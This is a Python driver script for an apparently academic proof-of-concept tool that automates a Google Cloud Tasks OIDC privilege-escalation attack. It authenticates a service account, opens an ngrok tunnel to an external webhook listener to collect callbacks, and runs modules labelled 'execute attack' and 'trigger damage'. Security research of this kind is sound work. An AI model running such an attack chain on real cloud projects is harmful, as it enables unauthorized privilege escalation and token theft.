import subprocess
import os
import time
import signal
import re
from pyfiglet import Figlet

def print_banner():
    f = Figlet(font='slant')
    print(f.renderText('CLOUD TFM TOOL'))

def run(command, step_desc):
    print(f"\n[✓] {step_desc}")
    try:
        subprocess.run(["python3", command], check=True)
    except subprocess.CalledProcessError as e:
        print(f"Error in Step: {step_desc}")
        print(e)
        exit(1)

def authenticate_service_account():
    print("[0/4] Authenticating service account...")
    result = subprocess.run([
        "gcloud", "auth", "activate-service-account",
        "internal-support@poc-tfm-tests.iam.gserviceaccount.com",
        "--key-file=internal-support-key.json",
        "--project=poc-tfm-tests"
    ], capture_output=True, text=True)

    if result.returncode != 0:
        print("[!] Authentication failed:")
        print(result.stderr)
        exit(1)
    else:
        print("[✓] Authentication successful.")

def kill_previous_listener():
    subprocess.run(["pkill", "-f", "webhook_listener.py"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def start_listener():
    print("[*] Starting webhook listener...")
    return subprocess.Popen(["python3", "modules/abuse_cloud_tasks/webhook_listener.py"])

def start_ngrok_and_get_url():
    print("[*] Starting ngrok tunnel...")
    ngrok_proc = subprocess.Popen(["ngrok", "http", "8080"],
				 stdout=subprocess.DEVNULL,
				 stderr=subprocess.DEVNULL)

    time.sleep(5)
    try:
        result = subprocess.check_output(["curl", "-s", "http://localhost:4040/api/tunnels"]).decode("utf-8")
        match = re.search(r'"public_url":"(https://[^"]+)"', result)
        if match:
            url = match.group(1)
            print(f"[+] Ngrok URL obtained: {url}")
            return ngrok_proc, url
        else:
            raise RuntimeError("Could not find public_url in ngrok response")
    except Exception as e:
        print(f"[!] Error getting Ngrok URL: {e}")
        ngrok_proc.terminate()
        return None, None

def save_url(url):
    with open("webhook_url.txt", "w") as f:
        f.write(url)

def main():
    print_banner()
    print(" " * 50 + "Author: Alejandro Onrubia Carrero")
    print(" " * 50 + "Version: 1.0 | July 2025")
    print(" ")

    print("Launching Offensive Automation: Cloud Tasks OIDC Privilege Escalation")

    authenticate_service_account()

    os.environ['PYTHONPATH'] = '.'

    # 🔁 Start listener + tunnel
    kill_previous_listener()
    listener_proc = start_listener()
    time.sleep(2)

    ngrok_proc, ngrok_url = start_ngrok_and_get_url()
    if not ngrok_url:
        print("[!] Could not get Ngrok URL. Aborting.")
        listener_proc.terminate()
        exit(1)

    save_url(ngrok_url)

    # 🧨 Run each step
    run("modules/abuse_cloud_tasks/1_create_vulnerable_env.py", "[1/4] Creating environment")
    run("modules/abuse_cloud_tasks/2_execute_attack.py", "[2/4] Executing attack")
    run("modules/abuse_cloud_tasks/3_trigger_damage.py", "[3/4] Triggering damage")
    authenticate_service_account()
    run("modules/abuse_cloud_tasks/4_cleanup.py", "[4/4] Cleaning up")

    print("\n[✔] All steps completed successfully.")

    # 🧹 Cleanup
    listener_proc.terminate()
    ngrok_proc.terminate()

if __name__ == "__main__":

    main()
